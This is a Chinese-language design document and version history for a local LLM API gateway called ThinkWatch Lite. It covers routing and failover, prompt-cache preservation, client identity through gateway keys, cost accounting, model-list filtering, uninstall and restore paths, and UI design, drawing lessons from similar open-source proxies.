# ThinkWatch Lite — 设计方案 v5.2

> 状态：初稿，待评审。凡标 **[待决策]** 的地方需要拍板后才能进入实现。
> 可读版本： https://claude.ai/code/artifact/c157a9d6-adb2-4b68-87a5-57ef42d173d1

## 变更记录

**v5.2** — 开始实施。M0 的主干在 2026-09-08 一天内跑通了，这一版记的是**动手之后才知道的事**。

**三处设计和实现对不上，都已改正文**：`streaming.rs` 不属于 `tw-protocol`（它依赖 axum 和企业版的 PII 还原器，那是 HTTP 层不是协议层，实际 452 行而不是 900）；`tw-crypto` 得有自己的错误类型，否则会把企业版的 `AppError` 拖进共用层；`CallCtx` 只能按值传，因为流是 `'static`，活得比任何借用都长。

**`CallCtx` 重构的规模估小了**：说的是「七个 provider 文件」，实际 21 个文件、+267/−102 —— provider 只占 7 个，其余是 handlers、两个包装 provider、路由、协议重学和散落的测试 mock。

**验证过的状态**：企业版 639 个测试跑在共享 crate 上、core 144 个，两边 clippy `-D warnings` 干净。`twcore serve` 起数据面加控制面，一个带工具定义的 Claude Code 请求原样转发、SSE 逐帧流回、网关密钥被换成上游的真 key、`/events` 上出现三条同 id 的生命周期事件。

**两个只有端到端测试才抓得到的 bug**（单元测试全绿的情况下）：上游连不上时事件流里什么都没有，UI 那一行会永远转圈；`RequestHeaders` 压根没发出去。两个都是编辑脚本的 anchor 静默没匹配上 —— **这类脚本必须断言，不能依赖 `.replace()` 的返回**。

**v5.1** — 推翻 v5.0 review 里我自己提的那条「矛盾」。

我说 §5.0 的安全卡片在没发现风险时显示「观察中，暂无发现」违反了 §7.7「答不上具体问题就删掉」的规矩。**那是错的。** 这张卡片回答的问题是「我现在安全吗」，而「是」是一个完整的答案——它和「总请求数 1,247」不是一回事：那个数字没有参照，而**安全状态的价值恰恰来自没有警报这件事本身**。烟感器有用正是因为它平时不响，你想看见那个绿灯来确认它还活着。

还有一层更实际的理由：**只在出事时才出现的卡片，是用户在最慌的时刻第一次见到的东西**——不知道它平时长什么样、不知道该不该信。常驻的绿色状态建立了基线，出问题时那个变化才有意义。

所以问题不在于该不该显示，在于**措辞**：「观察中，暂无发现」强调的是「我在看」，而用户想知道的是结论。改成结论优先的「安全」，下面跟一行依据（今日检查 1,247 个请求）——**一个只说「安全」而不说依据的指示灯，用户很快就会当它是张静态图**。顺带 §7.7 那条判据补了边界：它问的是「能不能回答一个问题」，不是「有没有变化」。

**v5.0** — 全文 review 的结果：补一个漏画的管线步骤，补一个被声明却从没设计的东西。

**管线图漏了探测拦截这一步。** §4.8 说「判定要放在选上游之前」，但 §4 的管线图里根本没有它——**这正是最容易变成 bug 的那种不一致**：设计在一处、图在另一处，实现时照着图写。补成第 1.3 步，并写明为什么它在模型准入之前：**一个被本地应答的请求永远不会到达任何上游，而模型准入回答的是「哪些上游可以为你服务」，对它无从谈起。** 这是有理由的边界，不是「单一决策点」的例外。

**§9.8 回放测试集。** 风险表里写着「上游方言的持续漂移」，对策是「建立回放测试集」——**然后全文再没有任何设计**。而这一路积累的证据全都指向它：Codex 在一个 patch 版本里改 `auth.json` 语义、codex-cli 0.147 默认开 goals、`x-stainless-timeout` 透传导致上游断流、`reasoning_content` 的三种别名。**这类故障的共同点是：我们的单元测试全绿，用户照样挂。**

关键在于**我们有一个别人没有的优势——本来就看得见所有真实流量**。cc-switch 和 sub2api 得专门构造 fixture，我们只需要在 Requests 详情页加一个「另存为测试用例」。**脱敏必须是录制的一部分而不是事后补**，因为测试夹具会进 git。判据不比字节比语义（四个 token 维度、成本、`stop_reason`、工具调用）——**逐字节比对会每次都失败，然后所有人开始忽略它，这是测试集死掉最常见的方式**。

白捡一条：它同时解开了「零上传」和「可支持性」的矛盾。用户报 bug 时不用贴带密钥的日志，点一下导出一个**脱敏过的、可回放的**用例。

**v4.9** — 把「一键还原」从一句话补成完整设计（§7.15）。

之前「一键还原」在文档里出现过五次，但**从来没有设计**——没有 UI 位置、没有全局还原、没说数据从哪来、没处理部分失败。补齐：

**三个入口，覆盖三种心情**：单个客户端的「还原」、Clients 页顶部的「全部还原」、设置页最底部的「完全卸载」（内部就是调全部还原）。**按钮要一直可见，不能藏在二级菜单里**——用户敢按下「接管」的前提就是看得见退路，**藏起来的退路等于没有退路**。

**最容易做错的一点：还原和回滚是两个操作，长得很像。** 回滚用的是接管时的全文备份，语义是「我们写坏了这个文件」；还原用的是哨兵注释里的原值，语义是「我不用这个网关了」。**卸载必须走还原**——拿全文备份去覆盖，会把用户这三个月里加的 MCP server、调的权限、写的 hook 全部抹掉。这正是 §9.7 那条「还原不能擦掉我们没管的文件」的具体形态。

**四个必须处理的情况**：原值可能已经过期（换过 key，所以要展示 diff 让用户确认，**我们不猜哪个对，那是他的账号**）；部分失败要逐个报告并直接给出手动路径；文件被替换或删掉时如实说「这不是我们接管的那份了」而不是猜着写点什么；还原后的重启提示同样分两类——**接管时说错顶多让人多等，还原时说错会让人以为没还原干净**。

**一条容易漏的实现约束：还原走控制面，不依赖数据面。** 网关挂了的时候恰恰是最想还原的时候——所以 §2.2.1 的安全模式里，还原按钮必须可用。

**v4.8** — 补一个之前完全没有的章节，和一道关卡。

**§7.15 退出路径：用户怎么把我们卸干净。** 这是个真实的洞。场景：接管了五个客户端，用了三个月，把 App 拖进废纸篓——**五个客户端的 base_url 全都指向一个已经没人监听的端口，同时失效**，而用户很可能忘了是什么改的。**macOS 删应用没有卸载钩子**，我们没有任何机会做清理。所以这件事必须在写第一个字节到用户配置文件**之前**就设计好。最重要的一层成本几乎为零：**哨兵注释里写明原值**——它在我们完全不存在之后仍然有效，把「不可恢复」变成「看一眼就能恢复」。顺带补了数据导出：攒了半年的用量数据要能导出成 CSV，这和零上传立场是一致的——**数据是你的，我们不上传，也不扣着不给。**

**§11 加一道 M1 之后的检验关卡。** 19–24 周是**全职**估算，业余乘三是**一年半**——这个数字应该改变做事的顺序而不是被接受。M0+M1 之后停下来问一个只有一个正确答案的问题：**过去两周我每天都在用它吗？** 否就停，不要接着给一个自己都不用的东西加功能。这道关卡便宜在于：M1 之后放弃损失两个月，M5 之后才发现损失一年半。而且判据是行为不是想法。**顺带：M1 的产物已经足够单独发布**——一个能按模型分流、看得见成本、支持代理的本地网关，今天就比 cc-switch 有用。

**风险表补三条**：卸载后客户端全瞎、一个人做不完、**M5 被严重低估**（2–3 周只够 `observe` 态加一两条最高危规则，`enforce` 的误报调优是持续投入，不是一个里程碑能封口的）。

**把新内容排进里程碑**：H2 keep-alive 和探测请求本地应答进 M1，订阅额度被动采样和 §0.6 的触发条件机制进 M3。

**v4.7** — 一个新功能，一条架构红线，两个统一原语。

**§4.3.2 订阅额度：答案就在响应头里。** 之前订阅型账号的成本栏只显示「订阅」——诚实但是空的。**其实那个数字一直在我们手上**：Anthropic 在每个响应的头里带着 `anthropic-ratelimit-unified-5h-utilization` / `-reset` / `-status` 和 7d 那一组，Codex 是同形状的 `x-codex-*`。**零成本**——不发额外请求、不要额外 scope、顺着真实流量白捡。这填上三个洞：菜单栏对订阅用户终于有了他真正关心的数字（「5h 窗口 62%，2 小时后重置」）、限流从突然发生变成可以提前预警、恢复由上游 `status: allowed` 驱动而不是干等计时器。**只被动采样不主动探测**——主动查会占用户自己的配额还可能触发上游反滥用检测，这个取舍在单用户场景只会更强。

**测速候选池和运行时候选池必须是同一个（§4.6）。** cc-switch 有一张多端点候选表给手动测速用，**而它在整个转发和故障转移路径里从来没被读过**——一套给人看，一套给机器用，两边不通。我们定死：测速结果直接改变故障转移优先级，用户看到的排序**就是**下一个请求会走的顺序，不存在「测完还要手动填一下」那一步。

**备份和脱敏都要做成统一原语（§7.11、§9.7）。** cc-switch 在三个互不相关的功能里各写了一次「操作前备份」；而它的环境变量备份**根本没有恢复入口**——后端写完了、前端封装也写好了，界面里没有任何地方调用。**备份是给写代码的人安心用的，恢复才是给用户用的。** 脱敏同理：深链接确认框对 API key 脱敏做得很仔细，同一个应用的环境变量面板却明文显示变量值——而那里面装的正好就是 key。

**顺带核实到一个「界面承诺 > 实际效果」的经典坑**：cc-switch 在 macOS 上删除「系统环境变量」类型的冲突**是空操作**（运行中的应用改不了启动它的那个 shell），但 UI 照样提示「删除成功」。这类失败比报错难查得多，因为一切看起来都对。

**v4.6** — 修一条自己写错的触发条件，加四条来自上手路径调研的。

**触发条件要绑在「问题存在吗」，不能绑在数量上（§0.6）。** 上一版把「路由规则编辑器」绑到 ≥2 个 provider，**这是错的**——它把「单上游多模型」这个最常见的场景一起挡在了门外。一个上游就有几十个模型，让 opus 实际打到 sonnet、长上下文走 1M 版本、按模型限额、给不同客户端指定不同模型，**全都只需要一家上游**。拆开：模型路由一直有，故障转移和分组才看 provider 数量。

**观察窗口对一半客户端是错的（§7.11）。** Claude Code / Gemini CLI 热重载，Codex 等读环境变量的**必须关掉终端重开**。所以对后者「五分钟没收到请求」是完全正常的——用户可能一整天没重开过终端。这时候弹「是不是没生效」是**狼来了**，被误报几次之后真正该看的那次也不会看了。按客户端类型分叉：热重载类才设超时提示，需重启类在接管那一刻就说清楚然后安静等着。

**两个新手引导会互相打架（§7.6）。** cc-switch 有个开关专门往 `settings.json` 写字段跳过 Claude Code 的引导——因为改完配置后 Claude Code 会以为自己第一次运行，弹出它自己的欢迎页把刚做完接管的用户搞懵。我们会撞上同一件事，但**不写那个字段**——只在完成那屏加一句「Claude Code 可能会弹一次它自己的欢迎页，点掉就行」。**一句话的解释，胜过偷偷改一个用户没让你改的字段。**

**把 shell 立场说诚实（§7.11）。** cc-switch 删 export 之前是**会备份**的，之前没写这一点。但备份解决不了真正的问题：shell 配置往往不是孤立文件——被 dotfile 管理器管着、在 git 里、有用户自己的条件逻辑，**本地备份对这三种情况一个都没帮上**。越的不是「数据安全」的界，是「这个文件归谁管」的界。

**备份要做成统一原语。** cc-switch 在三个互不相关的功能里各写了一次「操作前自动备份」——那说明三类事故都真实发生过，也说明散落实现最终一定会漏掉第四个地方。

**v4.5** — 新增一条贯穿全文的产品纪律，并按它推翻一个默认值。

**§0.6「配一个 API 就能用」。** 这份文档积累的能力已经不少——路由、分组、客户端身份、三态安全、预算、代理、脱敏、MCP 扫描。每条单独看都成立，**加在一起会压垮一个只想把 Claude Code 指到自己买的中转站的人**。所以把「只配一个 base_url 和一个 key 就完整可用」定成硬纪律，它同时约束配置格式、默认值、UI 和错误信息。三条推论：**默认值不能要求用户拥有额外的东西**；**高级功能要有触发条件，条件不满足就不出现**（不是折叠——折叠仍在制造焦虑）；**先有行为后有概念**（用户表达「我想让 Codex 走别的上游」，而不是先学「密钥即身份」）。

**按新纪律改掉 §4.8 的默认值。** 上一版把客户端辅助请求（标题生成等）默认路由到便宜上游，举的例子是本地 Ollama——**那是错的，普通人没有 Ollama**。改成默认原样放行：本地应答一个健康探测不需要用户有任何东西，而「把标题生成弄便宜点」无论怎么做都需要他手里有第二个更便宜的地方。`route` 保留为高级选项，且只有 ≥2 个 provider 时才出现在 UI 上。

**v4.4** — 把 cc-switch 与 sub2api 的事故记录挖了一遍，六条改了设计，一批实现约束单独归档。

**新增「客户端的自言自语」（§4.8）。** Claude Code 发出的请求里有一部分不是你发的——连通性探测、预热、标题生成。sub2api 把它们一律本地伪造应答，但那会让 `/resume` 里每个会话都叫 "New Conversation"。**分水岭是「拦掉之后用户会不会少一样东西」**：没有可见产物的本地应答（还顺带让离线时的健康检查不再失败），有可见产物的**路由到便宜上游**——这是我们有路由而 sub2api 没有的第三个选项。

**别碰请求前缀（§4.4）。** cc-switch 把 `role=system` 提到顶层，**上游前缀缓存命中率从 99% 掉到 20%**——因为 Claude Code 每轮都在会话中间注入 `<total_tokens>` 元数据，提到顶部等于每轮重写前缀。这是 §4.1「出站直通」最硬的证据：任何 body 改写都可能是缓存杀手，**而且是静默的，只有账单会涨**。

**白名单的方向决定生死（§7.11）。** cc-switch 做过一次 147 commits 的「字段级合并」，两天后整个撤回。看起来像在说别做字段级合并，其实不是——**白名单「要保留什么」是在枚举一个你不控制、还在增长的集合，注定追不上；白名单「要写什么」是你自己的行为，天然完备。** 措辞必须精确：不是「把我们认识的字段合并进去」，而是「除了这几个字段，其余字节原样不动」。

**连接自己死了但两端都不知道（§4.7）。** HTTP/2 池化连接被 NAT / 代理静默丢弃，下一个请求会等满内核重传（分钟级）。桌面用户挂 Clash / Surge 是常态，**几乎必踩**，而 hyper 默认不发任何健康 PING。补了 H2 keep-alive 三参数，以及一条同源的：`connect_timeout` 必须显式设，响应头超时覆盖不到 DNS 和 TCP 握手。

**成本记账不是统计（§4.7）。** 「观测失败不能拖垮数据面」有个例外。sub2api 的用量队列溢出时丢弃，造成「已扣费但无记录」的**永久对账缺口**。判据：延迟直方图丢了只是图上少个点，token 数和成本丢了账单永久对不上。后者溢出时内联写，提交点放在响应已经发给客户端之后。

**熔断必须 fail-open（§4.2）。** 全部候选都被熔断时放行而不是拒绝——服务器还能换个实例，**单用户桌面没有第二条路**。唯一上游时完全旁路熔断器，否则它把用户锁死。参数只留两个：cc-switch 那套的「错误率 + 最小请求数」在单用户下几乎永远打不满。

**新增 §9.7「别人用血换来的清单」。** 不改架构但会咬人的实现约束，集中当代码审查检查项：中文输入法在受控 input 里把 12 字符写成 1396 字符（Tauri + WebKit + 中文用户，三条全中）、macOS 自动大写毁 API key、按字节切字符串 panic（cc-switch 栽了两次）、Tauri capability 漏配是静默失败、GUI 的 PATH 不是 shell 的 PATH、日志持久化前的四层脱敏、SQLite「schema 太新」的恢复界面。


**v4.3** — 补两处从 cc-switch 学到但之前没写的东西。

**「我明明配了为什么不生效」的诊断**（§7.11）。这是接管类工具最常见的支持问题，cc-switch 为此做了一整套环境变量冲突检测，说明这坑够常见。原因有六种，其中**最常见的那个判据便宜得离谱**：如果客户端进程的启动时间早于我们写配置的时间，它肯定还没读到——一次进程查询就能得出结论。

更要紧的是**事后验证比事前检查可靠**：静态扫描证明不了「接管真的生效了」，优先级链有五层，任何一层出意外都可能让静态结论出错。所以接管后进入一个**观察窗口**，收到该客户端的请求才标记为「已验证」，五分钟没收到就提示并给诊断入口。**改完文件就宣布成功，和确认请求真的过来了，是两种产品。**

**但不自动改用户的 shell 配置。** cc-switch 会去剥掉 `.zshrc` 里冲突的 export，我们不这么做——理由和不自动删过期条目一样：**那是用户的文件**。shell 配置尤其敏感，可能用 dotfile 管理器同步、可能在 git 里、可能有自己的逻辑。我们只报告加给一条可复制的命令，**修改是他的权利**。

**顺带记一个单文件配置的白捡红利**（§3.1）：cc-switch 内置了 WebDAV 和 S3 两套云同步，我们不需要——配置就一个文件，iCloud、Syncthing、git、rsync 随便哪个都能同步。内置云同步意味着凭据存储、冲突合并、加密传输、服务不可用一整套复杂度，**只为把一个几 KB 的文件搬到另一台机器**。


**v4.2** — 补 UI 的设计骨架（§7），之前只有页面清单和四个展开的页面。

**投入要严重倾斜**（§7.2）。十二个页面里 Requests 和 Dashboard 承担九成窗口使用时间，其余是「配一次就不常回来」的。最容易犯的错是把力气平摊——十个页面都做得精致，结果主战场不够好而配置页过度设计。

**实时数据管线是 UI 侧唯一的真技术难点**（§7.3）。一个流式请求每秒几十条事件，十个并发就是每秒几百条，每条都 `setState` 会把 React 打死。四层解决：事件先进 `useRef` 缓冲不进 state、按帧 flush 不按事件、进行中的请求单独放一个 map 完成后才进列表、**图表不走 React**（这正是选 uPlot 的原因）。另外窗口不可见时直接断开订阅。

**Dashboard 第一屏只回答两个问题**（§7.7）：「现在正常吗」和「今天花了多少」。而且成本要带参照——「较昨日同期 ↑12%」比孤立的 `$3.42` 有用得多，**一个数字只有在有参照时才能支持决策**。判据是：每个元素都要能回答一个具体问题，答不上来就删掉。

**表单和文本要能互相跳转**（§7.10）。在表单里选中一个 provider 能跳到配置文件里高亮那一段，反过来也行。这个联动让用户建立「表单就是文件的另一种视图」的心智，而且能亲眼看到「改一个字段，文件里只有那一行变了」——**比任何文档都更能建立信任**。

**空状态是首次体验的一部分**（§7.13）：新装的应用打开时显示「暂无数据」是浪费机会，该显示可复制的客户端配置和一个写入按钮，接上首次运行的最后两步。

顺带按编号重排了整个 §7 的物理顺序，并合并了两节重复的配置页内容。


**v4.1** — 定义 `expires_at` 到期后的行为（§3.3.1）：**失效，但不删**。

不自动删的理由牵扯一个更大的原则：**配置文件是用户的资产，我们的每一次写入都必须是用户触发的**（§3.8）。程序在后台悄悄删掉几行配置正好违反它——用户某天 `git diff` 发现少了东西，不知道是谁干的。保留还有两个实际好处：能一键续期，以及留下「我上个月借给谁过」的审计痕迹。

**过期判断不需要定时任务**，每次请求比一下就够。起定时器扫描会违反「没有请求时不做任何周期性工作」，而且毫无必要——一个过期且没人用的 key 不构成任何问题。代价是不会主动通知，告警发生在下次有人撞上它的时候。

顺带定死时区：`expires_at: 2026-09-15` 是**本地时区**当天结束，**不接受裸的 UTC 日期**——那会让「我说的 15 号」和「程序理解的 15 号」差出八小时，而这偏差在借用场景下正好卡在最尴尬的时候。


**v4.0** — 两条修正。

**一、价目表那节删掉了对比论证。** 决定做完了就不该在设计文档里留一堆「为什么否掉别的」，那是把论证当结论写。现在只说选了什么、为什么（一个字段：1 小时缓存写入价格）、怎么用。顺带把交叉校验的对象从「另一个第三方数据集」改成**厂商官方定价页**——那个「数据集三天后才修正降价」的案例恰恰说明，拿第三方校验第三方只是把赌注换个地方押。

**二、修正「密钥是识别不是路由」这个说法。** 它在单机场景下对，**一到局域网就站不住**。准确的框架是：**key → 身份 → 挂在这个身份上的一整套策略**。准入是必须的，可见性默认自动，而「待遇」（路由、预算、并发、有效期）单机常常用不上、**局域网必需**——那时 key 就是「给谁什么待遇」的唯一抓手。

这补上了一个**真实缺口**：预算和并发上限之前只有全局和 per-provider 两个维度，**缺按客户端**。单机无所谓，一开局域网就暴露——某台机器上的失控脚本能吃光你整天的额度而你没手段限制。现在 `clients` 段能配 `allow` / `budget` / `max_concurrent` / `expires_at`，同一个身份的所有策略集中在一处。

`expires_at` 值得单独提：临时把网关借人时，到期自动失效比「记得回头删掉」可靠得多——**忘记回收的临时授权是共享场景里最常见的漏洞**。

还定死一条实现约束：**策略绑在 `name` 上，不是绑在 `key` 上**。key 是可轮换的，而策略和历史统计不该跟着丢。不这么定的话，第一次轮换密钥就会把统计打断。


**v3.9** — 价目表的来源定了（§4.3.0）。

**用 LiteLLM 那份 JSON**，决定性理由是一个字段：`cache_creation_input_token_cost_above_1hr`。它是公开数据集里**唯一编码了 Anthropic「1 小时缓存写入」价格的**——其他候选都只有 5 分钟档，而两者差 60%（Sonnet 4.5 是 3.75 对 6.00）。用户开 1 小时 TTL 就会被系统性低估，这和「绝不编造成本数字」直接冲突，因为**低估比不知道更糟**。

**发版前和厂商官方定价页核对**，不和另一个第三方数据集对——那只是把赌注换个地方押。理由是实测到的一个案例：某个广泛使用的数据集在 OpenAI 降价后**三天才修正**，中间一直返回偏高 25% 的价格，因为它的同步脚本只自动同步模型清单、价格靠人工 PR。这个核对是 CI 检查，用户侧零复杂度。

**价格变得比想象中频繁**：近 30 天有 74 次提交改动了价格行，一线厂商大约每月都有修正。所以更新频率定为月级（原以为季度够），而且**成本数字旁边要标价目表日期**（`$0.0142 · 价目表 2026-09-08`）——一个可能过期几天的数字，标上日期比不标好得多。

**成本建模成三态而不是 `Option<f64>`**：`Known` / `Unknown` / `NotApplicable`。`Option` 会诱使人写 `unwrap_or(0.0)`，而**把未知当成零就是在编造数字**。缓存 TTL 未知时也落到 `Unknown`，不猜便宜那档。

**OpenRouter 不能用**（ToS 禁止抓取复制和开发竞品）。**单位换算要写测试**：LiteLLM 是每 token，多数数据源是每百万，差 10⁶。

**v3.8** — 澄清一个容易混的点：**密钥是「认出你是谁」，不是「决定你走哪」**（§3.3.1）。

不分清这两件事，会以为路由都得按客户端配，把配置想复杂。实际上密钥只做识别，路由是拿着识别出的身份**加上请求的一堆其他属性**去匹配规则——§3.4 那张表里有十几个条件（模型、上下文长度、是否带工具、会话花了多少、时段……），**`client` 只是其中一个，而且经常用不上**。

**如果你所有客户端一视同仁，密钥对路由零影响**，它退化成纯粹的门禁加记账凭据。这是常见情况：很多人的路由规则全按模型和上下文长度写，压根不提客户端。

顺带列清密钥的三个用途，只有第三个和路由有关：**准入**（必须，门禁）、**可见性**（默认自动，不用配）、**路由的一个可选条件**。第二条容易被忽略——「Claude Code 只看到 claude 系模型」发生在列表和准入那一层，和「这个请求走哪个上游」完全无关。


**v3.7** — 补 §3.3.1 客户端身份。前面反复说「按客户端过滤」「按客户端路由」，却一直没讲清楚**我们到底怎么知道这个请求是谁发的**——这是路由和模型列表的共同前提，不该缺。

**答案是网关密钥，一把认一个人。** 完整链路四步：首次运行生成 → 接管时写进各客户端配置 → 请求进来从四个位置读（Bearer、`x-api-key`、`x-goog-api-key`、query 参数，**四种都要支持**，只认一种的话用户手动配过另一种就撞 401）→ 认出身份后用在模型过滤、路由条件、请求列表、成本归因四处。

**为什么不用 cc-switch 那种 URL 路径前缀**：路径不是身份（谁都能构造，没有验证）、每个客户端地址不一样容易配错、加客户端要改路由表。最实在的一条是**路径分不开同一种客户端的多个实例**——给工作项目和个人项目的 Claude Code 各配一把 key，就能分开看请求、分开算钱、走不同的路由，而两个 Claude Code 发出的请求路径完全一样。

另外定死一条：**不认识的密钥要拒绝，而且要和「没带密钥」区分开**。前者是「你配错了或配置被改过」，后者是「你还没配」，原因完全不同，给同一个错误信息会让人排查半天。


**v3.6** — 补「给某个客户端钉死一组模型」的做法，以及一条**必须说清楚的限制**（§3.9）。

`allow` 写 glob 是模式过滤，**写精确名字就是固定列表**，这部分本来就能做到。但有个限制之前没写：**我们控制不了客户端内置的模型别名**。Claude Code 的选择器里除了从网关发现的，还有它自己的 sonnet / opus / haiku，那部分不归我们管——用户选了内置的 haiku，请求打过来撞上 `allow` 就是 403，**效果成了「能看到但用不了」**。

三条出路，推荐第一条：**用路由解决而不是拒绝**（把 haiku 导向便宜池子，照常能用只是走了别处）；或接管时用环境变量覆盖内置别名；真要禁止才让它 403，而且错误信息得说人话。

顺带给了一张「三个客户端三种做法」的表：Claude Code 要 `allow` 加环境变量两手都做，Codex 只能写它的本地模型目录文件（它压根不问我们要列表），Zed 的 anthropic 块 `allow` 就够。


**v3.5** — 补路由的配置指南和一个**之前没定义的默认行为**（§3.4）。

**路由分三层，按需加深**：只配 provider 就能跑（按声明顺序故障转移，很多人到此为止）；加 routes 按请求特征分流，`to` **可以直接指 provider** 不必先建组；真需要「多个 provider 表现得像一个」时才用策略组。实现上没有两套逻辑——层 0 内部就是「一个隐式的 fallback 组加一条兜底规则」。

**多个上游支持同一个模型时，默认是故障转移，不是负载均衡。** 这个默认值之前没写，而它很关键。理由不是保守：**负载均衡会摧毁 prompt cache**。缓存按 provider 隔离，长会话每轮跳不同的家就永远命中不了，而缓存命中与否成本差 5 到 10 倍——**随机分流的代价可能是账单翻几倍，收益却只是「分散负载」，而单用户桌面场景根本没有需要分散的负载**。

负载均衡的正当场景只有一个：多个**等价账号**（同一家开了三个号绕限流），而且必须开会话粘滞。另外给策略组表加了一列缓存影响，`url-test`、`cheapest`、无粘滞的 `load-balance` 都标 ⚠️，UI 上选中时要提示。

顺带澄清一个容易混的点：**首字节前的故障转移不影响缓存**。那是故障驱动的偶发切换，切过去会稳定待着；负载均衡是每次都跳。两者频率完全不同。


**v3.4** — §3.9 重写。上一版把设计埋在了一堆「谁错在哪」的论证里，读完不知道到底怎么做。这版先讲**是什么**（三句话加一个走完整流程的例子），再讲**为什么**。设计本身没变。


**v3.3** — §3.9 换了根本思路：**推导，而不是声明**。

**先承认 v3.1 那版的毛病**：我设计了一个手写的 `models` 目录，每条带 `to: sonnet-pool`。**那个 `to` 是错的**——§3.4 的 routes 已经在决定「这个请求去哪」，两个地方做同一件事必然打架（一个 250k 的 sonnet 请求，目录说走 A、routes 说走 B，听谁的？）。而且它要用户手写维护一份清单，那份清单大部分时候就是「上游有什么就暴露什么」的重复劳动。

**cc-switch 不优雅的根源**：它的设计里**没有「身份」这个概念**。靠 URL 路径前缀猜客户端、靠预设把模型写死在环境变量里、靠 `model.contains("haiku")` 这种子串匹配改名——整套流程里没有一个地方能回答「这个请求是谁发的、他该得到什么」。我们有它没有的东西：**网关密钥本身就是身份**，所有客户端指向同一个 URL。

**新方案**：模型列表从 **L2 探测**推导（§4.6 本来就在打上游的 `/v1/models`，同一份数据两个用途），依次按 provider 启用状态、客户端方言、可选的 `allow` glob 过滤。**零配置就能工作**，客户端那段瘦成一个可选的 `allow` 列表。

**这一改让一整类麻烦消失**，因为它们全都源自「我们试图发明模型名」这一个决定：未识别 id 让输出上限降到 32000、`claude-` 前缀和上下文窗口变量的冲突、目录和 routes 谁说了算、手写维护清单——**四条全部不存在了**。默认透传不只是保守的选择，它让问题从设计里消失，这比给每个坑写一条警告好得多。

**「虚拟模型」的需求引导到 routes**：想要「sonnet-cheap 走便宜池」就写一条 `when: { client: xxx }` 的规则，效果一样但不发明名字。代价是客户端下拉框里看不到那个字样——**而这恰恰是对的**，客户端的模型选择器该反映「我要什么级别的模型」，不该泄漏「走哪条线路」这种网关内部的事。

**额外红利**：推导出的「模型 → 哪些 provider 支持它」映射，正好是路由和策略组需要的信息——能校验策略组里真有成员支持某模型、能发现 provider 悄悄下线了模型、能让配置校验提前报错。**一次探测，三处受益。**


**v3.2** — 第二轮调研（Claude Code 二进制反编译 + 各客户端实测）。**它推翻了我 v3.1 刚写进去的一条，还查出一对我完全不知道的冲突约束。**

**修正一条错的**：我写「换模型名会作废 prompt cache」，说过头了。Anthropic 的缓存文档**完全没提 model 维度的作用域**，而且更要紧的是——我们改的是**发给上游的名字**，只要上游收到的稳定，缓存就稳定。纯改名不影响缓存。真会作废缓存的是 §3.4 那个 `set: { model }`，那是真换了模型。**两件事要分清。**

**查出一对互相冲突的硬约束**：想让模型出现在 Claude Code 的选择器里，id 必须带 `claude` 或 `anthropic`（发现逻辑会静默丢弃其余的）；但 `CLAUDE_CODE_MAX_CONTEXT_TOKENS` **只对不以 `claude-` 开头的 id 生效**。**这两条直接打架。**出路是用 `anthropic/xxx` 这种带词但不以 `claude-` 打头的形式。

**Claude Code 确实会调 `/v1/models`，但默认关闭**——要 `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1`，而触发的其余条件（自定义 base URL、非官方域名）我们的场景正好全部命中。接管时要顺手写上这个变量，否则整条 HTTP 路径白做。

**Codex 实测不问我们要列表**，只发 `POST /v1/responses`。想让它看到定制模型只能写它的本地模型目录文件，而且改完要重启。

**别在 `/v1/models` 响应里堆能力元数据**：Claude Code 的解析 schema 只有 `{id, display_name?}`，其余**全部丢弃**，包括 Anthropic 官方那个完整的 capabilities 对象。它读能力靠的是另一套环境变量。

**一个印证**：Claude Code 二进制里带着 Anthropic 自己的多用户网关，它的模型列表**既传给 `/v1/models` 也传给转发路径**——和 §3.9 的「单一决策点」是同一个结论。但它的空数组语义是「只有默认模型」，我们**故意选了不同的**（一个都不给），因为桌面工具的空数组是用户自己写的明确意图，不需要兜底。


**v3.0 / v3.1** — 新增 §3.9 模型目录。v3.1 用 one-api 和 new-api 的实证重写。

**先发现一个确定的缺口**：数据面端点清单里**根本没有 `GET /v1/models`**。很多 OpenAI 兼容客户端启动时就会调它验证连接，返回 404 会让它们直接判定端点不可用。

**厘清三层模型名**：客户端看到的名字（`models` 目录，新增）→ 路由 → provider 的 `model_map`（上游翻译）→ 上游真实收费的名字（计价用）。前两层容易混为一谈，但它们是不同方向的翻译。

**从 one-api 和 new-api 的分歧里学到两条**（两个项目在同一问题上选择不同，其中一个是错的）：

*列表必须是转发层能兑现的承诺。* one-api 的 `/v1/models` 会返回 token 的模型列表，但**短路了可达性检查**——列表广告了一个模型，发请求却 503。new-api 用三层交集（组可达 ∩ token 允许 ∩ 有计价）做对了。我们的版本：目录 ∩ 客户端允许 ∩ 路由目标存在，临时熔断不算（那会让客户端以为模型没了）。

*单一决策点。* 这是两个项目**共同的 bug 来源**：one-api 在认证中间件里查、依赖 body 里的 `model`，于是不带 model 的端点直接绕过；new-api 在分发器里查，但那段在 `else` 分支里，走指定渠道时完全不执行。所以我们做成**一个 `resolve_allowed_models()` 函数、两处调用**——`/v1/models` 用它列，转发路径用它拦。列表和准入不可能不一致。顺带覆盖了 `GET /v1/models/:model`，那个端点在两个项目里**都没过滤**，是个真洞。

**「不写」和「空数组」必须是两个意思。** 这两个项目的语义正好相反（one-api 空=全放行，new-api 空=全禁止），分歧本身就说明容易错。我们定死：不写等于按方言自动过滤，`[]` 等于一个都不给。

**模型名归一化复用计价那套**（§4.3.0）。不一致会造出「能用但算不出价钱」这种自相矛盾。顺带避开 one-api 那个逗号拼接不 trim 的坑——`"gpt-4, gpt-4o"` 里的第二个永远匹配不上。

**按方言返回不同响应结构**，判断方式抄 new-api 的请求头法。但不抄它在 OpenAI 格式里多塞的那个非标准 `success` 字段——兼容就要严格兼容。

**License**：new-api 是 AGPL-3.0，比 sub2api 的 LGPL 更严。设计可以参考，代码一行不抄（§0.5）。

**v2.9** — 补关窗的三个连带问题（§2.4），顺手修掉资源目标表里的一处残留。

「点红叉只隐藏、不退出进程」v2.6 就写了，但有三件直接相关的事没写：

**隐藏还是销毁 webview。** Tauri 的 webview 通常占几十到上百 MB，对一个常驻菜单栏、可能几天不开一次窗口的工具不是小数目。但销毁会丢前端状态（滚动位置、当前 tab、编辑中的内容）。**先做隐藏，M3 实测内存后再决定**——理由和 `ProcessType` 那条一样，不要凭猜测提前复杂化。

**有未保存的配置编辑时不能静默隐藏。** Monaco 里改了还没保存就点红叉，要弹保存/放弃/取消。这条必须显式实现，因为「隐藏窗口」不像「退出应用」会被系统自然拦一道。

**记住窗口位置和大小。** 用 Tauri 的 window-state 插件。

